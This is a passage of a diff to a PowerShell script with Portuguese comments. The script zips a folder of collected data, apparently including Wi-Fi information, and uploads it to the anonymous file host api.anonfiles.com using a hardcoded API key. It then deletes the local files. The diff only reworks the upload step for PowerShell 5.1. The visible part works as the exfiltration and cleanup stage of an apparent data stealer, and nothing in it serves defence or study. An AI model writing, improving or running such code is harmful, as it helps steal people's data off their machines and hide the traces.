@@ -68,11 +68,22 @@ Remove-Item $wifiDir -Recurse -Force
 # ---------- 6) Compactar ----------
 [IO.Compression.ZipFile]::CreateFromDirectory($work, $zip, 'Optimal', $false)
 
-# ---------- 7) Upload AnonFiles ----------
+# ---------- 7) Upload AnonFiles (PS 5.1 compatível) + sua key ----------
 try {
-    $res = Invoke-RestMethod -Uri 'https://api.anonfiles.com/upload' -Method Post -Form @{ file = Get-Item -LiteralPath $zip }
+    Add-Type -AssemblyName System.Net.Http
+    $client  = New-Object System.Net.Http.HttpClient
+    $content = New-Object System.Net.Http.MultipartFormDataContent
+    $fileStream = [System.IO.File]::OpenRead($zip)
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $content.Add($fileContent, "file", [IO.Path]::GetFileName($zip))
+
+    # URL com sua API key
+    $url = "https://api.anonfiles.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d"
+    $response = $client.PostAsync($url, $content).Result
+    $body     = $response.Content.ReadAsStringAsync().Result
+    $json     = $body | ConvertFrom-Json
     Write-Host "`nUpload OK – link:" -ForegroundColor Green
-    $res.data.file.url.full
+    $json.data.file.url.full
 } catch {
     Write-Host "`nUpload falhou: $($_.Exception.Message)" -ForegroundColor Red
 }
@@ -80,3 +91,4 @@ try {
 # ---------- 8) Limpar ----------
 Remove-Item $work -Recurse -Force
 Remove-Item $zip  -Force
+
